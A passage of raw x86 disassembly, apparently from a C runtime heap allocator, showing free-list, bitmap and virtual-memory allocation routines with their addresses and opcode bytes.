  41411b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41411e:	21 71 04             	and    %esi,0x4(%ecx)
  414121:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  414124:	8b 71 08             	mov    0x8(%ecx),%esi
  414127:	8b 49 04             	mov    0x4(%ecx),%ecx
  41412a:	89 4e 04             	mov    %ecx,0x4(%esi)
  41412d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  414130:	8b 71 04             	mov    0x4(%ecx),%esi
  414133:	8b 49 08             	mov    0x8(%ecx),%ecx
  414136:	89 4e 08             	mov    %ecx,0x8(%esi)
  414139:	8b 75 0c             	mov    0xc(%ebp),%esi
  41413c:	eb 03                	jmp    0x414141
  41413e:	8b 5d 08             	mov    0x8(%ebp),%ebx
  414141:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  414145:	75 08                	jne    0x41414f
  414147:	3b da                	cmp    %edx,%ebx
  414149:	0f 84 80 00 00 00    	je     0x4141cf
  41414f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  414152:	8d 0c d1             	lea    (%ecx,%edx,8),%ecx
  414155:	8b 59 04             	mov    0x4(%ecx),%ebx
  414158:	89 4e 08             	mov    %ecx,0x8(%esi)
  41415b:	89 5e 04             	mov    %ebx,0x4(%esi)
  41415e:	89 71 04             	mov    %esi,0x4(%ecx)
  414161:	8b 4e 04             	mov    0x4(%esi),%ecx
  414164:	89 71 08             	mov    %esi,0x8(%ecx)
  414167:	8b 4e 04             	mov    0x4(%esi),%ecx
  41416a:	3b 4e 08             	cmp    0x8(%esi),%ecx
  41416d:	75 60                	jne    0x4141cf
  41416f:	8a 4c 02 04          	mov    0x4(%edx,%eax,1),%cl
  414173:	88 4d 0f             	mov    %cl,0xf(%ebp)
  414176:	fe c1                	inc    %cl
  414178:	83 fa 20             	cmp    $0x20,%edx
  41417b:	88 4c 02 04          	mov    %cl,0x4(%edx,%eax,1)
  41417f:	73 25                	jae    0x4141a6
  414181:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  414185:	75 0e                	jne    0x414195
  414187:	8b ca                	mov    %edx,%ecx
  414189:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  41418e:	d3 eb                	shr    %cl,%ebx
  414190:	8b 4d 08             	mov    0x8(%ebp),%ecx
  414193:	09 19                	or     %ebx,(%ecx)
  414195:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  41419a:	8b ca                	mov    %edx,%ecx
  41419c:	d3 eb                	shr    %cl,%ebx
  41419e:	8d 44 b8 44          	lea    0x44(%eax,%edi,4),%eax
  4141a2:	09 18                	or     %ebx,(%eax)
  4141a4:	eb 29                	jmp    0x4141cf
  4141a6:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  4141aa:	75 10                	jne    0x4141bc
  4141ac:	8d 4a e0             	lea    -0x20(%edx),%ecx
  4141af:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4141b4:	d3 eb                	shr    %cl,%ebx
  4141b6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4141b9:	09 59 04             	or     %ebx,0x4(%ecx)
  4141bc:	8d 4a e0             	lea    -0x20(%edx),%ecx
  4141bf:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4141c4:	d3 ea                	shr    %cl,%edx
  4141c6:	8d 84 b8 c4 00 00 00 	lea    0xc4(%eax,%edi,4),%eax
  4141cd:	09 10                	or     %edx,(%eax)
  4141cf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4141d2:	89 06                	mov    %eax,(%esi)
  4141d4:	89 44 30 fc          	mov    %eax,-0x4(%eax,%esi,1)
  4141d8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4141db:	ff 08                	decl   (%eax)
  4141dd:	0f 85 f7 00 00 00    	jne    0x4142da
  4141e3:	a1 20 73 45 00       	mov    0x457320,%eax
  4141e8:	85 c0                	test   %eax,%eax
  4141ea:	0f 84 dc 00 00 00    	je     0x4142cc
  4141f0:	8b 0d 38 73 45 00    	mov    0x457338,%ecx
  4141f6:	8b 35 e4 80 41 00    	mov    0x4180e4,%esi
  4141fc:	68 00 40 00 00       	push   $0x4000
  414201:	c1 e1 0f             	shl    $0xf,%ecx
  414204:	03 48 0c             	add    0xc(%eax),%ecx
  414207:	bb 00 80 00 00       	mov    $0x8000,%ebx
  41420c:	53                   	push   %ebx
  41420d:	51                   	push   %ecx
  41420e:	ff d6                	call   *%esi
  414210:	8b 0d 38 73 45 00    	mov    0x457338,%ecx
  414216:	a1 20 73 45 00       	mov    0x457320,%eax
  41421b:	ba 00 00 00 80       	mov    $0x80000000,%edx
  414220:	d3 ea                	shr    %cl,%edx
  414222:	09 50 08             	or     %edx,0x8(%eax)
  414225:	a1 20 73 45 00       	mov    0x457320,%eax
  41422a:	8b 40 10             	mov    0x10(%eax),%eax
  41422d:	8b 0d 38 73 45 00    	mov    0x457338,%ecx
  414233:	83 a4 88 c4 00 00 00 	andl   $0x0,0xc4(%eax,%ecx,4)
  41423a:	00 
  41423b:	a1 20 73 45 00       	mov    0x457320,%eax
  414240:	8b 40 10             	mov    0x10(%eax),%eax
  414243:	fe 48 43             	decb   0x43(%eax)
  414246:	a1 20 73 45 00       	mov    0x457320,%eax
  41424b:	8b 48 10             	mov    0x10(%eax),%ecx
  41424e:	80 79 43 00          	cmpb   $0x0,0x43(%ecx)
  414252:	75 09                	jne    0x41425d
  414254:	83 60 04 fe          	andl   $0xfffffffe,0x4(%eax)
  414258:	a1 20 73 45 00       	mov    0x457320,%eax
  41425d:	83 78 08 ff          	cmpl   $0xffffffff,0x8(%eax)
  414261:	75 69                	jne    0x4142cc
  414263:	53                   	push   %ebx
  414264:	6a 00                	push   $0x0
  414266:	ff 70 0c             	push   0xc(%eax)
  414269:	ff d6                	call   *%esi
  41426b:	a1 20 73 45 00       	mov    0x457320,%eax
  414270:	ff 70 10             	push   0x10(%eax)
  414273:	6a 00                	push   $0x0
  414275:	ff 35 3c 73 45 00    	push   0x45733c
  41427b:	ff 15 88 80 41 00    	call   *0x418088
  414281:	a1 24 73 45 00       	mov    0x457324,%eax
  414286:	8b 15 28 73 45 00    	mov    0x457328,%edx
  41428c:	8d 04 80             	lea    (%eax,%eax,4),%eax
  41428f:	c1 e0 02             	shl    $0x2,%eax
  414292:	8b c8                	mov    %eax,%ecx
  414294:	a1 20 73 45 00       	mov    0x457320,%eax
  414299:	2b c8                	sub    %eax,%ecx
  41429b:	8d 4c 11 ec          	lea    -0x14(%ecx,%edx,1),%ecx
  41429f:	51                   	push   %ecx
  4142a0:	8d 48 14             	lea    0x14(%eax),%ecx
  4142a3:	51                   	push   %ecx
  4142a4:	50                   	push   %eax
  4142a5:	e8 c6 f2 ff ff       	call   0x413570
  4142aa:	8b 45 08             	mov    0x8(%ebp),%eax
  4142ad:	83 c4 0c             	add    $0xc,%esp
  4142b0:	ff 0d 24 73 45 00    	decl   0x457324
  4142b6:	3b 05 20 73 45 00    	cmp    0x457320,%eax
  4142bc:	76 04                	jbe    0x4142c2
  4142be:	83 6d 08 14          	subl   $0x14,0x8(%ebp)
  4142c2:	a1 28 73 45 00       	mov    0x457328,%eax
  4142c7:	a3 30 73 45 00       	mov    %eax,0x457330
  4142cc:	8b 45 08             	mov    0x8(%ebp),%eax
  4142cf:	a3 20 73 45 00       	mov    %eax,0x457320
  4142d4:	89 3d 38 73 45 00    	mov    %edi,0x457338
  4142da:	5b                   	pop    %ebx
  4142db:	5f                   	pop    %edi
  4142dc:	5e                   	pop    %esi
  4142dd:	c9                   	leave
  4142de:	c3                   	ret
  4142df:	a1 24 73 45 00       	mov    0x457324,%eax
  4142e4:	8b 0d 34 73 45 00    	mov    0x457334,%ecx
  4142ea:	57                   	push   %edi
  4142eb:	33 ff                	xor    %edi,%edi
  4142ed:	3b c1                	cmp    %ecx,%eax
  4142ef:	75 34                	jne    0x414325
  4142f1:	8d 44 89 50          	lea    0x50(%ecx,%ecx,4),%eax
  4142f5:	c1 e0 02             	shl    $0x2,%eax
  4142f8:	50                   	push   %eax
  4142f9:	ff 35 28 73 45 00    	push   0x457328
  4142ff:	57                   	push   %edi
  414300:	ff 35 3c 73 45 00    	push   0x45733c
  414306:	ff 15 f0 80 41 00    	call   *0x4180f0
  41430c:	3b c7                	cmp    %edi,%eax
  41430e:	75 04                	jne    0x414314
  414310:	33 c0                	xor    %eax,%eax
  414312:	5f                   	pop    %edi
  414313:	c3                   	ret
  414314:	83 05 34 73 45 00 10 	addl   $0x10,0x457334
  41431b:	a3 28 73 45 00       	mov    %eax,0x457328
  414320:	a1 24 73 45 00       	mov    0x457324,%eax
  414325:	8b 0d 28 73 45 00    	mov    0x457328,%ecx
  41432b:	56                   	push   %esi
  41432c:	68 c4 41 00 00       	push   $0x41c4
  414331:	6a 08                	push   $0x8
  414333:	ff 35 3c 73 45 00    	push   0x45733c
  414339:	8d 04 80             	lea    (%eax,%eax,4),%eax
  41433c:	8d 34 81             	lea    (%ecx,%eax,4),%esi
  41433f:	ff 15 8c 80 41 00    	call   *0x41808c
  414345:	3b c7                	cmp    %edi,%eax
  414347:	89 46 10             	mov    %eax,0x10(%esi)
  41434a:	75 04                	jne    0x414350
  41434c:	33 c0                	xor    %eax,%eax
  41434e:	eb 43                	jmp    0x414393
  414350:	6a 04                	push   $0x4
  414352:	68 00 20 00 00       	push   $0x2000
  414357:	68 00 00 10 00       	push   $0x100000
  41435c:	57                   	push   %edi
  41435d:	ff 15 14 80 41 00    	call   *0x418014
  414363:	3b c7                	cmp    %edi,%eax
  414365:	89 46 0c             	mov    %eax,0xc(%esi)
  414368:	75 12                	jne    0x41437c
  41436a:	ff 76 10             	push   0x10(%esi)
  41436d:	57                   	push   %edi
  41436e:	ff 35 3c 73 45 00    	push   0x45733c
  414374:	ff 15 88 80 41 00    	call   *0x418088
  41437a:	eb d0                	jmp    0x41434c
  41437c:	83 4e 08 ff          	orl    $0xffffffff,0x8(%esi)
  414380:	89 3e                	mov    %edi,(%esi)
  414382:	89 7e 04             	mov    %edi,0x4(%esi)
  414385:	ff 05 24 73 45 00    	incl   0x457324
  41438b:	8b 46 10             	mov    0x10(%esi),%eax
  41438e:	83 08 ff             	orl    $0xffffffff,(%eax)
  414391:	8b c6                	mov    %esi,%eax
  414393:	5e                   	pop    %esi
  414394:	5f                   	pop    %edi
  414395:	c3                   	ret
  414396:	55                   	push   %ebp
  414397:	8b ec                	mov    %esp,%ebp
  414399:	51                   	push   %ecx
  41439a:	51                   	push   %ecx
  41439b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41439e:	8b 41 08             	mov    0x8(%ecx),%eax
  4143a1:	53                   	push   %ebx
  4143a2:	56                   	push   %esi
  4143a3:	8b 71 10             	mov    0x10(%ecx),%esi
  4143a6:	57                   	push   %edi
  4143a7:	33 db                	xor    %ebx,%ebx
  4143a9:	eb 03                	jmp    0x4143ae
  4143ab:	d1 e0                	shl    %eax
  4143ad:	43                   	inc    %ebx
  4143ae:	85 c0                	test   %eax,%eax
  4143b0:	7d f9                	jge    0x4143ab
  4143b2:	8b c3                	mov    %ebx,%eax
  4143b4:	69 c0 04 02 00 00    	imul   $0x204,%eax,%eax
  4143ba:	8d 84 30 44 01 00 00 	lea    0x144(%eax,%esi,1),%eax
  4143c1:	6a 3f                	push   $0x3f
  4143c3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4143c6:	5a                   	pop    %edx
  4143c7:	89 40 08             	mov    %eax,0x8(%eax)
  4143ca:	89 40 04             	mov    %eax,0x4(%eax)
  4143cd:	83 c0 08             	add    $0x8,%eax
  4143d0:	4a                   	dec    %edx
  4143d1:	75 f4                	jne    0x4143c7
  4143d3:	6a 04                	push   $0x4
  4143d5:	8b fb                	mov    %ebx,%edi
  4143d7:	68 00 10 00 00       	push   $0x1000
  4143dc:	c1 e7 0f             	shl    $0xf,%edi
  4143df:	03 79 0c             	add    0xc(%ecx),%edi
  4143e2:	68 00 80 00 00       	push   $0x8000
  4143e7:	57                   	push   %edi
  4143e8:	ff 15 14 80 41 00    	call   *0x418014
  4143ee:	85 c0                	test   %eax,%eax
  4143f0:	75 08                	jne    0x4143fa
  4143f2:	83 c8 ff             	or     $0xffffffff,%eax
  4143f5:	e9 9d 00 00 00       	jmp    0x414497
  4143fa:	8d 97 00 70 00 00    	lea    0x7000(%edi),%edx
  414400:	3b fa                	cmp    %edx,%edi
  414402:	89 55 fc             	mov    %edx,-0x4(%ebp)
  414405:	77 43                	ja     0x41444a
  414407:	8b ca                	mov    %edx,%ecx
  414409:	2b cf                	sub    %edi,%ecx
  41440b:	c1 e9 0c             	shr    $0xc,%ecx
  41440e:	8d 47 10             	lea    0x10(%edi),%eax
  414411:	41                   	inc    %ecx
  414412:	83 48 f8 ff          	orl    $0xffffffff,-0x8(%eax)
  414416:	83 88 ec 0f 00 00 ff 	orl    $0xffffffff,0xfec(%eax)
  41441d:	8d 90 fc 0f 00 00    	lea    0xffc(%eax),%edx
  414423:	89 10                	mov    %edx,(%eax)
  414425:	8d 90 fc ef ff ff    	lea    -0x1004(%eax),%edx
  41442b:	c7 40 fc f0 0f 00 00 	movl   $0xff0,-0x4(%eax)
  414432:	89 50 04             	mov    %edx,0x4(%eax)
  414435:	c7 80 e8 0f 00 00 f0 	movl   $0xff0,0xfe8(%eax)
  41443c:	0f 00 00 
  41443f:	05 00 10 00 00       	add    $0x1000,%eax
  414444:	49                   	dec    %ecx
  414445:	75 cb                	jne    0x414412
  414447:	8b 55 fc             	mov    -0x4(%ebp),%edx
  41444a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  41444d:	05 f8 01 00 00       	add    $0x1f8,%eax
  414452:	8d 4f 0c             	lea    0xc(%edi),%ecx
  414455:	89 48 04             	mov    %ecx,0x4(%eax)
  414458:	89 41 08             	mov    %eax,0x8(%ecx)
  41445b:	8d 4a 0c             	lea    0xc(%edx),%ecx
  41445e:	89 48 08             	mov    %ecx,0x8(%eax)
  414461:	89 41 04             	mov    %eax,0x4(%ecx)
  414464:	83 64 9e 44 00       	andl   $0x0,0x44(%esi,%ebx,4)
  414469:	33 ff                	xor    %edi,%edi
  41446b:	47                   	inc    %edi
  41446c:	89 bc 9e c4 00 00 00 	mov    %edi,0xc4(%esi,%ebx,4)
  414473:	8a 46 43             	mov    0x43(%esi),%al
  414476:	8a c8                	mov    %al,%cl
  414478:	fe c1                	inc    %cl
  41447a:	84 c0                	test   %al,%al
  41447c:	8b 45 08             	mov    0x8(%ebp),%eax
  41447f:	88 4e 43             	mov    %cl,0x43(%esi)
  414482:	75 03                	jne    0x414487
  414484:	09 78 04             	or     %edi,0x4(%eax)
  414487:	ba 00 00 00 80       	mov    $0x80000000,%edx
  41448c:	8b cb                	mov    %ebx,%ecx
  41448e:	d3 ea                	shr    %cl,%edx
  414490:	f7 d2                	not    %edx
  414492:	21 50 08             	and    %edx,0x8(%eax)
  414495:	8b c3                	mov    %ebx,%eax
  414497:	5f                   	pop    %edi
  414498:	5e                   	pop    %esi
  414499:	5b                   	pop    %ebx
  41449a:	c9                   	leave
  41449b:	c3                   	ret
  41449c:	55                   	push   %ebp
  41449d:	8b ec                	mov    %esp,%ebp
  41449f:	83 ec 0c             	sub    $0xc,%esp
  4144a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4144a5:	8b 41 10             	mov    0x10(%ecx),%eax
